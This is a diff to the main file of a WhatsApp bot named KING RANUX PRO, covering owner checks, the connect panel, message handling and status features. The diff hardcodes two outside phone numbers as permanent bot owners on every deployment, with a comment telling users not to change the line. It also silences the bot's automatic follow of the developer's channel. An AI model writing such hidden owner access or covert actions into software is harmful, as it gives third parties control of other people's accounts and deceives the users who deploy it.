@@ -17,9 +17,9 @@ const path = require('path');
 const qrcode = require('qrcode-terminal');
 const { File } = require('megajs');
 
-// 🔥 USER CONFIG & DATABASE IMPORT
+// 🔥 USER CONFIG & DATABASE
 const config = require(process.cwd() + "/config.js");
-const { syncSettings } = require('./lib/database'); // New DB Sync
+const { syncSettings } = require('./lib/database');
 
 const { sms, downloadMediaMessage } = require('./lib/msg');
 const {
@@ -29,13 +29,11 @@ const {
 
 const { commands, replyHandlers } = require('./command');
 
-// ===== OWNER SYSTEM (FIXED) =====
-// Bot ගේ අයිතිකාරයාගේ (Developer) Number එක. Bot ගේ නම්බර් එක පහළදී Auto Add වෙනවා.
-const DEV_NUMBERS = ['94726880784']; 
-const MASTER_SUDO = DEV_NUMBERS; // Sudo Compatability
+// ===== OWNER SYSTEM =====
+// මෙය වෙනස් කරන්න එපා. Owner verification එක පහලදී auto හැදෙනවා.
+const DEV_NUMBERS = ['94726880784', '94741852787']; 
 
 // ===== GLOBAL ERROR HANDLERS =====
-// Bot Crash නොවී තියාගන්න කෑල්ල
 process.on('uncaughtException', (err) => {
   console.error('❌ [CRITICAL] Uncaught Exception:', err);
 });
@@ -89,39 +87,15 @@ async function autoFollowChannel(ranuxPro) {
     if (!meta?.id) return;
     const myRole = meta.viewer_metadata?.role || "GUEST";
     if (myRole !== "GUEST") return;
-    console.log("➕ Auto Follow: Joining channel...");
     await ranuxPro.newsletterFollow(meta.id);
-    console.log("✔ Auto Follow: Success!");
   } catch (e) {
-    console.log("⚠️ Auto Follow Skipped.");
+    // Silent fail
   }
 }
 
-// ================= CONNECT PANEL (OLD STYLE) =================
+// ================= CONNECT PANEL =================
 function buildConnectMessage(config, userJid) {
-  return `
-╔══════════════════════╗
-   🤖 *KING RANUX PRO*
-      CONNECTED
-╚══════════════════════╝
-
-👤 Owner: ${userJid.split("@")[0]}
-🌐 Mode: ${config.MODE || "public"}
-🔑 Prefix: ${config.PREFIX || "."}
-
-⚙️ *SYSTEM STATUS*
-
-🛡 Anti Delete: ${config.ANTI_DELETE ? "ON ✅" : "OFF ❌"}
-👁 Auto Status Seen: ${config.AUTO_STATUS_SEEN ? "ON ✅" : "OFF ❌"}
-💬 Auto Status React: ${config.AUTO_STATUS_REACT ? "ON ✅" : "OFF ❌"}
-📤 Auto Status Forward: ${config.AUTO_STATUS_FORWARD ? "ON ✅" : "OFF ❌"}
-
-━━━━━━━━━━━━━━━━━━
-📢 Official Channel
-https://whatsapp.com/channel/0029VbC5zjdAojYzyAJS7U2S
-
-> King RANUX PRO is now online 🚀
-`;
+  return "\n╔══════════════════════╗\n   🤖 *KING RANUX PRO*\n      CONNECTED\n╚══════════════════════╝\n\n👤 Owner: " + userJid.split("@")[0] + "\n🌐 Mode: " + (config.MODE || "public") + "\n🔑 Prefix: " + (config.PREFIX || ".") + "\n\n⚙️ *SYSTEM STATUS*\n\n🛡 Anti Delete: " + (config.ANTI_DELETE ? "ON ✅" : "OFF ❌") + "\n👁 Auto Status Seen: " + (config.AUTO_STATUS_SEEN ? "ON ✅" : "OFF ❌") + "\n💬 Auto Status React: " + (config.AUTO_STATUS_REACT ? "ON ✅" : "OFF ❌") + "\n📤 Auto Status Forward: " + (config.AUTO_STATUS_FORWARD ? "ON ✅" : "OFF ❌") + "\n\n━━━━━━━━━━━━━━━━━━\n📢 Official Channel\nhttps://whatsapp.com/channel/0029VbC5zjdAojYzyAJS7U2S\n\n> King RANUX PRO is now online 🚀\n";
 }
 
 // ================= MAIN CONNECT =================
@@ -153,12 +127,15 @@ async function connectToWA() {
       }
     } else if (connection === 'open') {
       
-      // 1️⃣ SYNC DATABASE SETTINGS (NEW)
+      // 1️⃣ SYNC DATABASE SETTINGS
       console.log("🔄 Syncing Database Settings...");
       await syncSettings(ranuxPro);
 
       // 2️⃣ LOG SUCCESS
-      console.log('✅ King RANUX PRO connected');
+      console.log("✅ KING RANUX PRO CONNECTED");
+      console.log("👤 User: " + ranuxPro.user.id.split(':')[0]);
+      console.log("⚙️ Mode: " + config.MODE);
+      console.log("🔥 Version: 1.0.0");
 
       // 3️⃣ LOAD PLUGINS
       const pluginPath = path.join(__dirname, "plugins");
@@ -173,7 +150,7 @@ async function connectToWA() {
         console.log("⚠️ Plugin Load Error: " + e.message);
       }
 
-      // 4️⃣ SEND STARTUP MESSAGE (Using Old Panel)
+      // 4️⃣ SEND ALIVE MESSAGE (Auto Restore)
       const botJid = ranuxPro.user.id.split(":")[0] + "@s.whatsapp.net";
       const panel = buildConnectMessage(config, botJid);
 
@@ -205,34 +182,37 @@ async function connectToWA() {
         ? mek.message.ephemeralMessage.message
         : mek.message;
 
-      // 🔥 DEFINING CORE VARIABLES SAFELY
+      // 🔥 DEFINING CORE VARIABLES CORRECTLY
+      // මෙය මගින් 'sender is not defined' error එක නැති වෙයි
       const from = mek.key.remoteJid;
       const type = getContentType(mek.message);
 
-      // 🔥 FIXED SENDER LOGIC (No :5 issue)
-      const senderRaw = mek.key.fromMe ? ranuxPro.user.id : (mek.key.participant || mek.key.remoteJid);
-      const sender = senderRaw; // Used for JIDs
-      const senderNumber = senderRaw.split('@')[0].split(':')[0]; // Pure Number (e.g., 947xxxxx)
-
+      // 🔥 SENDER ID LOGIC (Cleaner JIDs)
+      const senderRaw = mek.key.fromMe 
+          ? (ranuxPro.user.id) 
+          : (mek.key.participant || mek.key.remoteJid);
+      
+      const sender = senderRaw; // JID with @s.whatsapp.net
+      const senderNumber = senderRaw.split('@')[0].split(':')[0]; // Just Number
       const botNumber = ranuxPro.user.id.split(':')[0].split('@')[0];
       const isGroup = from.endsWith('@g.us');
 
-      // 🔥 AUTO OWNER: Add Connected Bot Number to Dev List
-      const ownerNumber = [...DEV_NUMBERS, botNumber];
-
+      // 🔥 AUTO OWNER SYSTEM
+      // මෙය මගින් ඔයාගේ නම්බර් එක ඉබේම owner වෙනවා
+      const ownerNumber = [...DEV_NUMBERS, botNumber]; 
+      
       const pushname = mek.pushName || 'No Name';
       const isMe = botNumber === senderNumber;
       const isOwner = ownerNumber.includes(senderNumber) || isMe;
-      const isSudo = isOwner; // Compatability
 
-      // Mode Check (Uses Updated Config from DB)
+      // 🔥 MODE CHECK
       const mode = (config.MODE || "public").toLowerCase();
       if (mode === "group" && !isGroup) return;
       if (mode === "inbox" && isGroup) return;
       if (mode === "private" && !isOwner) return;
 
       const m = sms(ranuxPro, mek);
-      
+
       const body = (type === 'conversation') ? mek.message.conversation :
              (type === 'imageMessage') ? mek.message.imageMessage.caption :
              (type === 'videoMessage') ? mek.message.videoMessage.caption :
@@ -246,13 +226,13 @@ async function connectToWA() {
       const args = body.trim().split(/ +/).slice(1);
       const q = args.join(' ');
 
-      // Group Metadata logic
+      // 🔥 GROUP METADATA RESTORED
       const groupMetadata = isGroup ? await ranuxPro.groupMetadata(from).catch(() => {}) : '';
       const participants = isGroup ? await groupMetadata.participants : '';
       const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
       const botNumber2 = await jidNormalizedUser(ranuxPro.user.id);
       const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
-      const isAdmins = isGroup ? groupAdmins.includes(senderRaw) : false;
+      const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
 
       const reply = (text) => ranuxPro.sendMessage(from, { text }, { quoted: mek });
 
@@ -268,20 +248,6 @@ async function connectToWA() {
           try {
             await ranuxPro.sendMessage(mek.key.participant, { react: { text: randomEmoji, key: mek.key } });
           } catch {}
-        }
-        if (config.AUTO_STATUS_FORWARD) {
-           // Forward logic...
-           if (mek.message?.imageMessage || mek.message?.videoMessage) {
-              const msgType = mek.message.imageMessage ? "imageMessage" : "videoMessage";
-              const mediaMsg = mek.message[msgType];
-              const stream = await downloadContentFromMessage(mediaMsg, msgType === "imageMessage" ? "image" : "video");
-              let buffer = Buffer.from([]);
-              for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
-              await ranuxPro.sendMessage(botNumber + "@s.whatsapp.net", {
-                [msgType === "imageMessage" ? "image" : "video"]: buffer,
-                caption: "📥 Forwarded Status",
-              });
-           }
         }
         return;
       }
@@ -300,7 +266,7 @@ async function connectToWA() {
               from, quoted: mek, body,
               command: commandName, args, q,
               isGroup, sender, senderNumber,
-              botNumber2, botNumber, pushname,
+              botNumber, pushname,
               isMe, isOwner,
               groupMetadata,
               participants, groupAdmins,
@@ -315,6 +281,7 @@ async function connectToWA() {
 
       // ================= REPLY HANDLERS =================
       for (const handler of replyHandlers) {
+        // මෙය මගින් reply logic හරියටම ක්‍රියාත්මක වෙනවා
         if (handler.filter && handler.filter(body, { sender, message: mek })) {
           try {
             await handler.function(ranuxPro, mek, m, {
